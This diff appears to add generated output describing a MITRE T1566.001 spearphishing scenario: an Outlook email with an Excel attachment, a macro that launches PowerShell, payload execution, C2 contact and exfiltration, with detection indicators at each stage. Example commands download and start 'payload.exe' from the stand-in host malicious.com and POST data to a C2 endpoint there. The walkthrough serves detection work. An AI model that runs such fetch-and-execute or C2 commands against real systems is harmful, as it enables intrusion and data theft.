@@ -1,0 +1,70 @@
+<output>
+Pattern Name: T1566.001 (Spearphishing Attachment)
+Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to further exploitation. The attack involves multiple applications, including Outlook for email, Excel for the malicious attachment, and a web browser for subsequent command and control (C2) communication.
+
+Attack Flow Breakdown:
+
+1. **Initial Access via Email**
+   - **Application Involved**: Outlook
+   - **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice.xlsx".
+   - **Key Artifacts**: Email headers, attachment file "Invoice.xlsx".
+   - **Detection Indicators**: 
+     - Unusual sender email address.
+     - Attachment type (Excel file) and name pattern.
+
+2. **Opening the Malicious Attachment**
+   - **Application Involved**: Microsoft Excel
+   - **User Action**: The user opens the attachment "Invoice.xlsx".
+   - **Key Artifacts**: Excel file execution logs, potential macros within the file.
+   - **Detection Indicators**: 
+     - Execution of Excel with macros enabled.
+     - Macro execution logs indicating unusual commands (e.g., `Auto_Open` or `Workbook_Open`).
+
+3. **Macro Execution and Payload Download**
+   - **Application Involved**: Excel (parent), PowerShell (child)
+   - **User Action**: The macro executes, which runs a PowerShell command to download a malicious payload from a remote server.
+   - **Key Artifacts**: PowerShell command execution logs, downloaded file (e.g., "malicious.exe").
+   - **Detection Indicators**: 
+     - PowerShell command logs showing `Invoke-WebRequest` or `curl` commands.
+     - Network traffic to suspicious domains or IP addresses.
+
+   ```shell
+   # PowerShell command executed by the macro to download the payload
+   powershell -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\malicious.exe'"
+   ```
+
+4. **Execution of the Malicious Payload**
+   - **Application Involved**: Windows Explorer (parent), malicious executable (child)
+   - **User Action**: The user does not notice the download and the payload executes automatically or is executed by the user.
+   - **Key Artifacts**: Execution logs of "malicious.exe", process creation logs.
+   - **Detection Indicators**: 
+     - Execution of unknown or suspicious executables.
+     - Parent-child process relationships indicating unusual behavior.
+
+   ```shell
+   # Command to execute the downloaded payload
+   start C:\Users\Victim\Downloads\malicious.exe
+   ```
+
+5. **Establishing Command and Control**
+   - **Application Involved**: Malicious executable (parent), web browser (child)
+   - **User Action**: The malicious payload connects to a C2 server to receive further instructions.
+   - **Key Artifacts**: Network traffic logs, C2 communication patterns.
+   - **Detection Indicators**: 
+     - Outbound connections to known malicious IPs or domains.
+     - Unusual DNS queries or HTTP requests.
+
+   ```shell
+   # Example of C2 communication initiated by the payload
+   curl -X POST 'http://malicious.com/c2' -d 'data=payload_info'
+   ```
+
+6. **Data Exfiltration or Further Exploitation**
+   - **Application Involved**: Web browser (for data exfiltration), various applications for lateral movement
+   - **User Action**: The attacker may use the compromised system to exfiltrate data or move laterally within the network.
+   - **Key Artifacts**: Logs of data transfer, unusual file access patterns.
+   - **Detection Indicators**: 
+     - Large outbound data transfers.
+     - Access to sensitive files or directories not typically accessed by the user.
+
+</output>
